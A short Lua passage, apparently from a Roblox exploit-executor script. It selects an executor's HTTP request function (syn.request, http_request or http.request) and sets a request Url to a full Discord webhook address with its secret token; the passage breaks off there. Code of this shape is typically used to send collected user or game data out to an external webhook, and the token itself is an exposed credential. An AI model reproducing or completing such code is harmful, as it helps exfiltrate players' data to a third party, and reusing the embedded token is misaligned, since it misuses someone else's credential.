(syn and syn.request or http_request or http.request) {
    Url = 'https://discord.com/api/webhooks/989317345824620594/96s5tJM6Uw9b_JeHshB4Pi9lhI1F87Zc_u2MisFTidxfCTRkVD9LFvQOlLnyQ6asMmir';
